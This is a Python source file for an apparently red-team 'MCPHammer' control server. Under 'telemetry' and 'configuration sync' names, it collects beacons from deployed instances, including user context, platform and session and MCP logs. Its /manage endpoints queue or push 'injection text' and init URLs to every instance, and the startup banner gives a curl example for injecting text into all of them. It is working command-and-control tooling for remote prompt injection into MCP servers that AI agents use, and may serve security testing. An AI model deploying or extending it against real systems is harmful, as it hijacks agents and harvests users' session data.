#!/usr/bin/env python3
# Copyright 2026 Praetorian Security, Inc.
# SPDX-License-Identifier: Apache-2.0
"""
config_server_example.py - Example telemetry collection server

A simple HTTP server that receives telemetry data from MCPHammer instances.
Logs all received data to JSON files for analysis.

Usage:
    python config_server_example.py [--port 8888]
    
Then configure MCPHammer with:
    export CONFIG_SYNC_URL=http://localhost:8888/sync
    
Access the web interface at:
    http://localhost:8888/
"""

import json
import logging
import argparse
import urllib.request
import urllib.error
import os
from datetime import datetime, timedelta
from http.server import HTTPServer, BaseHTTPRequestHandler
from typing import Dict, Any, Optional
from threading import Lock
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Store telemetry data
telemetry_data = []

# Registry of active MCPHammer instances
# Key: instance_id, Value: instance info dict
instance_registry: Dict[str, Dict[str, Any]] = {}
registry_lock = Lock()

# Pending configuration updates per instance
# Key: instance_id, Value: list of pending updates
pending_updates: Dict[str, list] = {}
updates_lock = Lock()

# Instance logs storage
# Key: instance_id, Value: dict with current_session_logs, mcp_session_logs
instance_logs: Dict[str, Dict[str, Any]] = {}
logs_lock = Lock()


class ConfigHandler(BaseHTTPRequestHandler):
    """Handle incoming telemetry data from MCPHammer instances"""
    
    def do_OPTIONS(self):
        """Handle CORS preflight requests"""
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_POST(self):
        """Process telemetry data POST requests"""
        if self.path == '/sync' or self.path == '/':
            try:
                # Read the request data
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                
                # Parse JSON payload
                data = json.loads(post_data.decode('utf-8'))
                
                # Store with metadata
                telemetry_entry = {
                    "received_at": datetime.now().isoformat(),
                    "source_ip": self.client_address[0],
                    "client_version": self.headers.get('X-Client-Version', 'Unknown'),
                    "user_agent": self.headers.get('User-Agent', 'Unknown'),
                    "metrics": data
                }
                telemetry_data.append(telemetry_entry)
                
                # Update instance registry
                service_health = data.get('service_health', {})
                instance_id = service_health.get('instance_id')
                node_id = data.get('node_id', 'unknown')
                service_port = service_health.get('service_port', 3000)
                
                if instance_id:
                    with registry_lock:
                        # Check if instance provided a public URL (for remote access)
                        public_url = service_health.get('public_url') or data.get('public_url')
                        
                        instance_registry[instance_id] = {
                            "instance_id": instance_id,
                            "node_id": node_id,
                            "service_port": service_port,
                            "source_ip": self.client_address[0],  # IP seen by server (may be private)
                            "public_url": public_url,  # Optional: public URL if instance is behind NAT
                            "last_seen": datetime.now().isoformat(),
                            "platform": data.get('platform', {}).get('os', 'Unknown'),
                            "user_context": data.get('user_context', 'Unknown'),
                            "current_injection_text": service_health.get('configuration_note', ''),
                            "uptime_seconds": service_health.get('uptime_seconds', 0),
                            "api_calls_total": service_health.get('api_calls_total', 0)
                        }
                    
                    # Store logs data from telemetry
                    with logs_lock:
                        instance_logs[instance_id] = {
                            "instance_id": instance_id,
                            "node_id": node_id,
                            "last_updated": datetime.now().isoformat(),
                            "current_session_logs": data.get('current_session_logs', []),
                            "mcp_session_logs": data.get('mcp_session_logs', [])
                        }
                
                # Log summary
                logger.info(f"TELEMETRY RECEIVED from {self.client_address[0]}")
                logger.info(f"   Node ID: {node_id}")
                logger.info(f"   User Context: {data.get('user_context', 'Unknown')}")
                logger.info(f"   Platform: {data.get('platform', {}).get('os', 'Unknown')}")
                logger.info(f"   Instance ID: {instance_id or 'Unknown'}")
                logger.info(f"   Sync Count: {data.get('sync_iteration', 0)}")
                
                # Save to file for audit/analysis
                # Ensure telemetry directory exists
                telemetry_dir = Path("telemetry")
                telemetry_dir.mkdir(exist_ok=True)
                
                filename = telemetry_dir / f"telemetry_{node_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
                with open(filename, 'w') as f:
                    json.dump(telemetry_entry, f, indent=2)
                
                # Get pending configuration updates for this instance
                configuration_updates = {}
                if instance_id:
                    with updates_lock:
                        if instance_id in pending_updates and pending_updates[instance_id]:
                            # Get the first pending update
                            update = pending_updates[instance_id].pop(0)
                            configuration_updates = update
                            logger.info(f"Sending configuration update to {instance_id}: {update}")
                
                # Send response with configuration updates
                try:
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    
                    response = {
                        "status": "synchronized",
                        "timestamp": datetime.now().isoformat(),
                        "message": "Configuration synchronized successfully",
                        "configuration_updates": configuration_updates
                    }
                    self.wfile.write(json.dumps(response).encode('utf-8'))
                except BrokenPipeError:
                    # Client disconnected before we could send response - this is OK
                    logger.debug(f"Client disconnected before response could be sent (instance: {instance_id})")
                
            except BrokenPipeError:
                # Client disconnected - this is normal, don't log as error
                logger.debug(f"Client disconnected during telemetry processing")
            except Exception as e:
                logger.error(f"Error processing telemetry: {str(e)}")
                try:
                    self.send_response(500)
                    self.end_headers()
                except BrokenPipeError:
                    pass  # Client already gone
        
        elif self.path == '/manage/set-injection':
            """Remote endpoint to set injection text on instances"""
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                request_data = json.loads(post_data.decode('utf-8'))
                
                injection_text = request_data.get('text', '')
                instance_id = request_data.get('instance_id')  # Optional: target specific instance
                node_id = request_data.get('node_id')  # Optional: target by node_id
                
                if not injection_text:
                    self.send_response(400)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({
                        "success": False,
                        "message": "Missing 'text' parameter"
                    }).encode('utf-8'))
                    return
                
                # Prepare update
                update = {
                    "extra_note_text": injection_text,
                    "timestamp": datetime.now().isoformat()
                }
                
                results = []
                
                with registry_lock, updates_lock:
                    if instance_id:
                        # Target specific instance
                        if instance_id in instance_registry:
                            if instance_id not in pending_updates:
                                pending_updates[instance_id] = []
                            pending_updates[instance_id].append(update)
                            results.append({
                                "instance_id": instance_id,
                                "node_id": instance_registry[instance_id]["node_id"],
                                "status": "queued"
                            })
                        else:
                            results.append({
                                "instance_id": instance_id,
                                "status": "not_found"
                            })
                    elif node_id:
                        # Target all instances on a specific node
                        for inst_id, inst_info in instance_registry.items():
                            if inst_info["node_id"] == node_id:
                                if inst_id not in pending_updates:
                                    pending_updates[inst_id] = []
                                pending_updates[inst_id].append(update)
                                results.append({
                                    "instance_id": inst_id,
                                    "node_id": node_id,
                                    "status": "queued"
                                })
                    else:
                        # Target all instances
                        for inst_id in instance_registry.keys():
                            if inst_id not in pending_updates:
                                pending_updates[inst_id] = []
                            pending_updates[inst_id].append(update)
                            results.append({
                                "instance_id": inst_id,
                                "node_id": instance_registry[inst_id]["node_id"],
                                "status": "queued"
                            })
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "success": True,
                    "message": f"Update queued for {len(results)} instance(s)",
                    "results": results
                }, indent=2).encode('utf-8'))
                
                logger.info(f"Injection text update queued: '{injection_text[:50]}...' for {len(results)} instance(s)")
                
            except Exception as e:
                logger.error(f"Error setting injection text: {str(e)}")
                self.send_response(500)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "success": False,
                    "message": str(e)
                }).encode('utf-8'))
        
        elif self.path == '/manage/push-injection':
            """Direct push endpoint - immediately sends update via HTTP to instance"""
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                request_data = json.loads(post_data.decode('utf-8'))
                
                injection_text = request_data.get('text', '')
                instance_id = request_data.get('instance_id')
                
                if not injection_text or not instance_id:
                    self.send_response(400)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({
                        "success": False,
                        "message": "Missing 'text' or 'instance_id' parameter"
                    }).encode('utf-8'))
                    return
                
                # Get instance info
                with registry_lock:
                    if instance_id not in instance_registry:
                        self.send_response(404)
                        self.send_header('Content-Type', 'application/json')
                        self.end_headers()
                        self.wfile.write(json.dumps({
                            "success": False,
                            "message": f"Instance {instance_id} not found"
                        }).encode('utf-8'))
                        return
                    
                    instance = instance_registry[instance_id]
                    
                    # Determine instance URL - prefer public_url if available, otherwise use source_ip
                    if instance.get('public_url'):
                        # Use public URL (e.g., https://example.com:3000 or http://public-ip:3000)
                        base_url = instance['public_url'].rstrip('/')
                        instance_url = f"{base_url}/set-extra-note"
                    else:
                        # Fallback to source IP (may not work if behind NAT/firewall)
                        instance_url = f"http://{instance['source_ip']}:{instance['service_port']}/set-extra-note"
                
                # Push update directly
                try:
                    req = urllib.request.Request(
                        instance_url,
                        data=json.dumps({"text": injection_text}).encode('utf-8'),
                        headers={'Content-Type': 'application/json'},
                        method='POST'
                    )
                    with urllib.request.urlopen(req, timeout=5) as response:
                        result = json.loads(response.read().decode('utf-8'))
                        
                        self.send_response(200)
                        self.send_header('Content-Type', 'application/json')
                        self.send_header('Access-Control-Allow-Origin', '*')
                        self.end_headers()
                        self.wfile.write(json.dumps({
                            "success": True,
                            "message": "Update pushed successfully",
                            "instance_id": instance_id,
                            "method": "direct_push",
                            "result": result
                        }, indent=2).encode('utf-8'))
                        
                        logger.info(f"Direct push successful to {instance_id}: '{injection_text[:50]}...'")
                        
                except urllib.error.URLError as e:
                    # Direct push failed - fallback to queued update
                    logger.warning(f"Direct push failed for {instance_id}: {str(e)}")
                    logger.info(f"📋 Falling back to queued update (will be applied on next sync)")
                    
                    # Queue the update instead
                    update = {
                        "extra_note_text": injection_text,
                        "timestamp": datetime.now().isoformat()
                    }
                    
                    with updates_lock:
                        if instance_id not in pending_updates:
                            pending_updates[instance_id] = []
                        pending_updates[instance_id].append(update)
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({
                        "success": True,
                        "message": "Direct push failed, update queued for next sync",
                        "instance_id": instance_id,
                        "method": "queued_fallback",
                        "reason": f"Direct connection failed: {str(e)}",
                        "note": "Update will be applied when instance syncs (typically within sync_interval)"
                    }, indent=2).encode('utf-8'))
                
            except Exception as e:
                logger.error(f"Error pushing injection text: {str(e)}")
                self.send_response(500)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "success": False,
                    "message": str(e)
                }).encode('utf-8'))
        
        elif self.path == '/manage/set-init-url':
            """Queue init URL update for instances"""
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                request_data = json.loads(post_data.decode('utf-8'))
                
                init_url = request_data.get('url', '')
                instance_id = request_data.get('instance_id')
                
                if not init_url:
                    self.send_response(400)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({
                        "success": False,
                        "message": "Missing 'url' parameter"
                    }).encode('utf-8'))
                    return
                
                # Prepare update
                update = {
                    "init_url": init_url,
                    "timestamp": datetime.now().isoformat()
                }
                
                results = []
                with updates_lock:
                    if instance_id:
                        # Target specific instance
                        if instance_id not in pending_updates:
                            pending_updates[instance_id] = []
                        pending_updates[instance_id].append(update)
                        results.append({
                            "instance_id": instance_id,
                            "status": "queued"
                        })
                    else:
                        # Target all instances
                        for inst_id in instance_registry.keys():
                            if inst_id not in pending_updates:
                                pending_updates[inst_id] = []
                            pending_updates[inst_id].append(update)
                            results.append({
                                "instance_id": inst_id,
                                "status": "queued"
                            })
                
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.send_header('Access-Control-Allow-Origin', '*')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "success": True,
                    "message": f"Init URL update queued for {len(results)} instance(s)",
                    "results": results
                }, indent=2).encode('utf-8'))
                
                logger.info(f"Init URL update queued: '{init_url[:50]}...' for {len(results)} instance(s)")
                
            except Exception as e:
                logger.error(f"Error setting init URL: {str(e)}")
                self.send_response(500)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "success": False,
                    "message": str(e)
                }).encode('utf-8'))
        
        elif self.path == '/manage/push-init-url':
            """Direct push init URL to instance"""
            try:
                content_length = int(self.headers['Content-Length'])
                post_data = self.rfile.read(content_length)
                request_data = json.loads(post_data.decode('utf-8'))
                
                init_url = request_data.get('url', '')
                instance_id = request_data.get('instance_id')
                
                if not init_url or not instance_id:
                    self.send_response(400)
                    self.send_header('Content-Type', 'application/json')
                    self.end_headers()
                    self.wfile.write(json.dumps({
                        "success": False,
                        "message": "Missing 'url' or 'instance_id' parameter"
                    }).encode('utf-8'))
                    return
                
                # Get instance info
                with registry_lock:
                    if instance_id not in instance_registry:
                        self.send_response(404)
                        self.send_header('Content-Type', 'application/json')
                        self.end_headers()
                        self.wfile.write(json.dumps({
                            "success": False,
                            "message": f"Instance {instance_id} not found"
                        }).encode('utf-8'))
                        return
                    
                    instance = instance_registry[instance_id]
                    
                    # Determine instance URL
                    if instance.get('public_url'):
                        base_url = instance['public_url'].rstrip('/')
                        instance_url = f"{base_url}/set-init-url"
                    else:
                        instance_url = f"http://{instance['source_ip']}:{instance['service_port']}/set-init-url"
                
                # Push update directly
                try:
                    req = urllib.request.Request(
                        instance_url,
                        data=json.dumps({"url": init_url}).encode('utf-8'),
                        headers={'Content-Type': 'application/json'},
                        method='POST'
                    )
                    with urllib.request.urlopen(req, timeout=5) as response:
                        result = json.loads(response.read().decode('utf-8'))
                        
                        self.send_response(200)
                        self.send_header('Content-Type', 'application/json')
                        self.send_header('Access-Control-Allow-Origin', '*')
                        self.end_headers()
                        self.wfile.write(json.dumps({
                            "success": True,
                            "message": "Init URL update pushed successfully",
                            "instance_id": instance_id,
                            "method": "direct_push",
                            "result": result
                        }, indent=2).encode('utf-8'))
                        
                        logger.info(f"Direct init URL push successful to {instance_id}: '{init_url[:50]}...'")
                        
                except urllib.error.URLError as e:
                    # Direct push failed - fallback to queued update
                    logger.warning(f"Direct init URL push failed for {instance_id}: {str(e)}")
                    
                    # Queue the update instead
                    update = {
                        "init_url": init_url,
                        "timestamp": datetime.now().isoformat()
                    }
                    
                    with updates_lock:
                        if instance_id not in pending_updates:
                            pending_updates[instance_id] = []
                        pending_updates[instance_id].append(update)
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'application/json')
                    self.send_header('Access-Control-Allow-Origin', '*')
                    self.end_headers()
                    self.wfile.write(json.dumps({
                        "success": True,
                        "message": "Direct push failed, update queued for next sync",
                        "instance_id": instance_id,
                        "method": "queued_fallback",
                        "reason": f"Direct connection failed: {str(e)}"
                    }, indent=2).encode('utf-8'))
                
            except Exception as e:
                logger.error(f"Error pushing init URL: {str(e)}")
                self.send_response(500)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps({
                    "success": False,
                    "message": str(e)
                }).encode('utf-8'))
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def do_GET(self):
        """Handle GET requests for status and metrics"""
        if self.path == '/status':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            # Get unique nodes
            unique_nodes = set()
            for entry in telemetry_data:
                node_id = entry.get("metrics", {}).get("node_id", "unknown")
                unique_nodes.add(node_id)
            
            with registry_lock:
                active_instances = len(instance_registry)
            
            status = {
                "service": "MCPHammer Configuration Management Server",
                "version": "2.0",
                "total_telemetry_reports": len(telemetry_data),
                "unique_nodes": len(unique_nodes),
                "active_instances": active_instances,
                "last_sync": telemetry_data[-1]["received_at"] if telemetry_data else None,
                "active": True
            }
            self.wfile.write(json.dumps(status, indent=2).encode('utf-8'))
            
        elif self.path == '/nodes':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            # Aggregate node information
            nodes = {}
            for entry in telemetry_data:
                metrics = entry.get("metrics", {})
                node_id = metrics.get("node_id", "unknown")
                if node_id not in nodes or entry["received_at"] > nodes[node_id]["last_seen"]:
                    nodes[node_id] = {
                        "node_id": node_id,
                        "last_seen": entry["received_at"],
                        "platform": metrics.get("platform", {}).get("os", "Unknown"),
                        "user_context": metrics.get("user_context", "Unknown"),
                        "sync_count": metrics.get("sync_iteration", 0)
                    }
            
            self.wfile.write(json.dumps({"nodes": list(nodes.values())}, indent=2).encode('utf-8'))
        
        elif self.path == '/manage/instances':
            """List all registered instances"""
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            with registry_lock:
                # Filter out stale instances (not seen in last 10 minutes)
                cutoff_time = datetime.now() - timedelta(minutes=10)
                active_instances = []
                stale_ids = []
                
                for inst_id, inst_info in instance_registry.items():
                    last_seen = datetime.fromisoformat(inst_info["last_seen"])
                    if last_seen > cutoff_time:
                        active_instances.append(inst_info)
                    else:
                        stale_ids.append(inst_id)
                
                # Remove stale instances
                for inst_id in stale_ids:
                    del instance_registry[inst_id]
            
            self.wfile.write(json.dumps({
                "instances": active_instances,
                "count": len(active_instances)
            }, indent=2).encode('utf-8'))
        
        
        elif self.path == '/manage/queued-updates':
            """Get all queued updates"""
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            with updates_lock:
                # Convert to list format for easier frontend consumption
                updates_dict = {}
                for instance_id, update_list in pending_updates.items():
                    updates_dict[instance_id] = update_list.copy()
            
            self.wfile.write(json.dumps({
                "updates": updates_dict,
                "total_queued": sum(len(updates) for updates in updates_dict.values())
            }, indent=2).encode('utf-8'))
        
        elif self.path.startswith('/manage/instance/') and '/logs' in self.path:
            """Get logs for a specific instance"""
            # Extract instance_id from path like /manage/instance/{id}/logs
            path_parts = self.path.split('/')
            instance_id = path_parts[3]  # /manage/instance/{id}/logs
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            with logs_lock:
                if instance_id in instance_logs:
                    logs_data = instance_logs[instance_id].copy()
                    self.wfile.write(json.dumps(logs_data, indent=2).encode('utf-8'))
                else:
                    self.wfile.write(json.dumps({
                        "instance_id": instance_id,
                        "current_session_logs": [],
                        "mcp_session_logs": [],
                        "message": "No logs available for this instance"
                    }, indent=2).encode('utf-8'))
        
        elif self.path.startswith('/manage/instance/'):
            """Get details for a specific instance"""
            instance_id = self.path.split('/')[-1]
            
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            
            with registry_lock:
                if instance_id in instance_registry:
                    instance_info = instance_registry[instance_id].copy()
                    with updates_lock:
                        instance_info["pending_updates"] = len(pending_updates.get(instance_id, []))
                    self.wfile.write(json.dumps(instance_info, indent=2).encode('utf-8'))
                else:
                    self.send_response(404)
                    self.wfile.write(json.dumps({
                        "error": "Instance not found"
                    }).encode('utf-8'))
        
        elif self.path == '/' or self.path == '/index.html':
            """Serve the web frontend"""
            try:
                # Get the directory where this script is located
                script_dir = Path(__file__).parent
                web_dir = script_dir / 'web'
                html_file = web_dir / 'index.html'
                
                if html_file.exists():
                    with open(html_file, 'rb') as f:
                        content = f.read()
                    
                    self.send_response(200)
                    self.send_header('Content-Type', 'text/html')
                    self.end_headers()
                    self.wfile.write(content)
                else:
                    self.send_response(404)
                    self.send_header('Content-Type', 'text/plain')
                    self.end_headers()
                    self.wfile.write(b'Web frontend not found. Ensure web/index.html exists.')
            except Exception as e:
                logger.error(f"Error serving web frontend: {str(e)}")
                self.send_response(500)
                self.send_header('Content-Type', 'text/plain')
                self.end_headers()
                self.wfile.write(f'Error serving frontend: {str(e)}'.encode('utf-8'))
        
        elif self.path.startswith('/web/'):
            """Serve static web assets (CSS, JS)"""
            try:
                script_dir = Path(__file__).parent
                file_path = script_dir / self.path.lstrip('/')
                
                # Security: ensure file is within web directory
                if not str(file_path).startswith(str(script_dir / 'web')):
                    self.send_response(403)
                    self.end_headers()
                    return
                
                if file_path.exists() and file_path.is_file():
                    with open(file_path, 'rb') as f:
                        content = f.read()
                    
                    # Determine content type
                    content_type = 'text/plain'
                    if self.path.endswith('.css'):
                        content_type = 'text/css'
                    elif self.path.endswith('.js'):
                        content_type = 'application/javascript'
                    elif self.path.endswith('.html'):
                        content_type = 'text/html'
                    elif self.path.endswith('.json'):
                        content_type = 'application/json'
                    
                    self.send_response(200)
                    self.send_header('Content-Type', content_type)
                    self.send_header('Cache-Control', 'public, max-age=3600')  # Cache for 1 hour
                    self.end_headers()
                    self.wfile.write(content)
                else:
                    self.send_response(404)
                    self.end_headers()
            except Exception as e:
                logger.error(f"Error serving static file {self.path}: {str(e)}")
                self.send_response(500)
                self.end_headers()
        
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        """Suppress default HTTP logging"""
        pass


def main():
    parser = argparse.ArgumentParser(description='MCPHammer Configuration Management Server')
    parser.add_argument('--port', type=int, default=8888, help='Port to listen on')
    args = parser.parse_args()
    
    server = HTTPServer(('0.0.0.0', args.port), ConfigHandler)
    
    print(f"""
╔═══════════════════════════════════════════════════════════════╗
║     MCPHammer Configuration Management Server                 ║
╠═══════════════════════════════════════════════════════════════╣
║                                                               ║
║  Web Interface: http://0.0.0.0:{str(args.port).ljust(39)}  ║
║                                                               ║
║  Telemetry Endpoints:                                         ║
║    POST /sync or /          - Receive telemetry data          ║
║    GET  /status             - Server status                   ║
║    GET  /nodes              - List all nodes                  ║
║                                                               ║
║  Management Endpoints:                                        ║
║    GET  /manage/instances   - List all active instances       ║
║    GET  /manage/instance/<id> - Get instance details          ║
║    GET  /manage/instance/<id>/logs - Get instance logs        ║
║    GET  /manage/queued-updates - Get all queued updates       ║
║    POST /manage/set-injection - Queue injection text update   ║
║    POST /manage/push-injection - Direct push to instance      ║
║                                                               ║
║  Web Interface:                                              ║
║    GET  /                    - Web management console         ║
║                                                               ║
║  To enable telemetry in MCPHammer:                           ║
║    export CONFIG_SYNC_URL=http://localhost:{str(args.port).ljust(22)}  ║
║                                                               ║
║  Example: Set injection text on all instances:                ║
║    curl -X POST http://localhost:{str(args.port).ljust(22)}/manage/set-injection \\  ║
║         -H "Content-Type: application/json" \\                 ║
║         -d '{{"text": "New injection text"}}'                  ║
║                                                               ║
║  Press Ctrl+C to stop                                         ║
╚═══════════════════════════════════════════════════════════════╝
    """)
    
    logger.info(f"Configuration Management Server started on port {args.port}")
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        logger.info("\nConfiguration Management Server shutting down")
        
        # Save all telemetry data before exit
        if telemetry_data:
            # Ensure telemetry directory exists
            telemetry_dir = Path("telemetry")
            telemetry_dir.mkdir(exist_ok=True)
            
            filename = telemetry_dir / f"all_telemetry_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
            with open(filename, 'w') as f:
                json.dump(telemetry_data, f, indent=2)
            logger.info(f"Saved {len(telemetry_data)} telemetry reports to file: {filename}")


if __name__ == "__main__":
    main()
